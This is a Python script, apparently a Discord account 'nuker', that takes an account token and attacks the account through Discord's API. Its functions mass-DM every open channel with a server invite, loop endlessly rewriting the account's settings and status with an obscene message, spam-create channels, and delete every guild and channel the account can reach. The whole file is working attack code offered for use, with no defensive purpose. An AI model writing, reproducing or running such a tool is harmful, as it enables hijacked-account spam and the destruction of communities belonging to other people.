# In W.I.P, if you're wondering why there's some packages that aren't used that was for old code
import aiohttp
import threading
import json
import asyncio
import requests
import random
import time
# 14 60
token = ""
mesage = '''
discord.gg/fnNHWCMnuH
Retired by Asmicum'''
headers = {'Authorization':token,
            'Content_type':'application/json'
            }

def massdm():
    cheneel = requests.get("https://discord.com/api/v9/users/@me/channels",headers=headers).json()
    for channel in cheneel:
        try:
            requests.post(f'https://discord.com/api/v9/channels/'+channel['id']+'/messages',headers=headers,json={'content':mesage})
            print('Channel Id:'+channel[id])
        except Exception as e:
            print(f'Failed to send message, error: {e}')
    print(cheneel)

def Seizure():
    setting = {
        'theme':'light',
        'locale':random.choice(['ja','zh-TW','ko','zh-CN']),
        'custom_status':{
            'text':'FUCKED BY THE NECROMANCERS',
            'emoji_name':'⚰'
        }
    }
    while True:
        try:
            requests.patch("https://discord.com/api/v9/users/@me/settings", headers=headers,json=setting)
            print('Fucking account...')
            time.sleep(2)
        except Exception as e:
            print(f'Account may be disabled... {e}')
    
def mkchg():
    guildsIds = requests.get("https://discord.com/api/v9/users/@me/guilds", headers=headers).json()
    for guild in guildsIds:
        try:
            requests.post('https://discord.com/api/v9/guilds/'+guild['id']+'/channels',headers=headers,json={'name':'discord.gg/fnNHWCMnuH'})
            print('Making channels...')
            print(f'Guild id:'+guild['id'])
        except Exception as e:
            print(f'Failed, error : {e}')

def delchg():
    guildsIds = requests.get("https://discord.com/api/v9/users/@me/guilds", headers=headers).json()
    for guild in guildsIds:
        response = requests.get("https://discord.com/api/v9/guilds/"+guild['id']+"/channels",headers=headers)
        channels = response.json()
        for channel in channels:
            try:
                requests.delete("https://discord.com/api/v9/guilds/"+guild['id']+"/channels/"+channel['id'],headers=headers)
            except Exception as e:
                print(f'Failed to delete channel... : {e}')

def deleteg():
    guildsIds = requests.get("https://discord.com/api/v9/users/@me/guilds", headers=headers).json()
    for guild in guildsIds:
        try:
            requests.delete(f'https://discord.com/api/v9/guilds/'+guild['id'], headers=headers)
            print('Deleted : '+guild['name'])
        except Exception as e:
            print(f'Failed : {e}')

print('MD(1), SEIZURE(2), NG(3), DG(4)')
o = input('')
if o == '1':
    massdm()

if o == '2':
    Seizure()

if o == '3':
    #delchg()
    mkchg()


if o == '4':
    deleteg()
